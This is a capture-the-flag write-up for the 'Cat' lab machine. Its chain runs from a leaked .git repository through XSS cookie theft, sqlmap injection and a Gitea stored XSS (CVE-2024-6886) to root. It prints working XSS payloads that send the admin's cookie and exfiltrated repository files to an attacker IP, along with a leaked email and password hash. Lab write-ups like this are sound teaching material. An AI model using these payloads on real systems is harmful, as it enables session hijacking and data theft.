# Cat

```
Difficulty: Medium
Operating System: Linux
Hints: True
```


### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used                 | Result                                                                                                                                                                                                                                    |
| :--- | :------------ | :----------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | `N/A`         | **Nmap Scan**                  | Performed initial enumeration with **Nmap** to discover open ports. Found ports `22` (SSH) and `80` (HTTP).                                                                                                                               |
| 2    | `N/A`         | **Git Repository Leak**        | Discovered a publicly exposed `.git` directory. Used **`git-dumper`** to download the application source code, which revealed potential vulnerabilities in the code.                                                                      |
| 3    | `N/A`         | **XSS Vulnerability**          | Found that the username was directly output without sanitization in `view_cat.php`. Crafted an XSS payload that sent the administrator's session cookie to our server when viewed, enabling session hijacking.                            |
| 4    | `rosa`        | **SQL Injection on SQLite**    | Identified an unsanitized `catName` parameter in `accept_cat.php`. Used **`sqlmap`** to perform blind SQL injection and extract the `users` table, retrieving `rosa`'s password hash. Cracked it online to obtain the plaintext password. |
| 5    | `rosa`        | **User Access via SSH**        | Logged in as `rosa` using the cracked password. Retrieved `user.txt`.                                                                                                                                                                     |
| 6    | `N/A`         | **Local Port Forwarding**      | Forwarded port `3000` (internal Git service, Gitea v1.22.0) via SSH to local machine to analyze the internal service.                                                                                                                     |
| 7    | `N/A`         | **Stored XSS (CVE-2024-6886)** | Exploited a known Stored XSS in Gitea. Sent an email containing a malicious payload to the administrator (`jobert`) which exfiltrated the employee-management repository data, exposing sensitive files.                                  |
| 8    | `root`        | **Sensitive Data Exposure**    | Extracted the root password from the employee-management repository’s index.php file. Used this password to switch to `root` and retrieve `root.txt`.                                                                                     |


##  Step 1 – Initial Enumeration

**Nmap Scan:**

```bash
nmap -sC -sV cat.htb
```

**Result:**

```
22/tcp  open  ssh
80/tcp  open  http
```

* Port 80 is hosting a web server, possibly WordPress.
* SSH is available but no credentials yet.

---

##  Step 2 – Git Repository Leak

Browsing `http://cat.htb/.git/` revealed a publicly exposed Git repository.

**Dump the Git repo:**

```bash
git-dumper http://cat.htb/.git/ ./catgit
```

This revealed full application source code.

---

##  Step 3 – XSS Vulnerability

In `view_cat.php`, the code outputs the username directly without sanitization:

```php
<h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
<img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
```

### Attack Path:

* Register a new account with a username crafted as an XSS payload:

```html
<img src=1 onerror=this.src="http://10.10.xx.xx/?ccc="+encodeURIComponent(document.cookie)>
```

* Upload a random picture via `contest.php`.
* Wait for the administrator to visit and trigger the XSS.
* Captured session cookie is forwarded to our listener.

---

##  Step 4 – SQL Injection (SQLite)

In `accept_cat.php`:

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
```

This is vulnerable to SQL Injection.

**Exploit using sqlmap:**

```bash
sqlmap -u "http://cat.htb/accept_cat.php" \
  --cookie="PHPSESSID=your_session_id" \
  --data="catId=1&catName=123" \
  -p catName \
  --dbms=SQLite \
  --level=5
```

**Result:**

Discovered the `users` table containing credentials:

```
rosamendoza485@gmail.com : ac369922d560f17d6eeb8b2c7dec498c
```

Password was cracked online via [CrackStation](https://crackstation.net/).

---

##  Step 5 – User Access (rosa)

With the cracked password, logged in as `rosa`.

```bash
ssh rosa@cat.htb
```

### Found user.txt:

```bash
cat /home/rosa/user.txt
```

---

##  Step 6 – Local Port Forwarding

Found port `3000` open internally, running a Git service (Gitea v1.22.0).

**Forward the port:**

```bash
ssh -L 3000:127.0.0.1:3000 rosa@cat.htb
```

Access Gitea at `http://127.0.0.1:3000`.

---

##  Step 7 – Privilege Escalation via Stored XSS (CVE-2024-6886)

Identified a known vulnerability in Gitea v1.22.0 (Stored XSS).

### Attack steps:

* Send an email from `axel@localhost` to `jobert@localhost` containing a malicious link:

```bash
swaks --to "jobert@localhost" --from "axel@localhost" \
  --header "Click" --body "http://localhost:3000/axel/xss" \
  --server localhost
```

* The admin clicks the link, triggering XSS.
* Payload fetches sensitive files:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.xx.xx/?content='+encodeURIComponent(data)))">XSS test</a>
```

* Exfiltrated the employee-management index.php containing the root password.

---

##  Step 8 – Root Access

Used the obtained password from index.php to escalate to root:

```bash
su -
# Enter password from index.php
```

Obtained `root.txt`:

```bash
cat /root/root.txt
```

---

## Summary

* **User:** Found git leak → XSS cookie theft → SQLi to get rosa's credentials → Log into rosa → Found user.txt.
* **Root:** Port 3000 forwarded → Gitea (v1.22.0) XSS exploit → Admin accessed repository → Index file disclosed root password → Got root.txt.

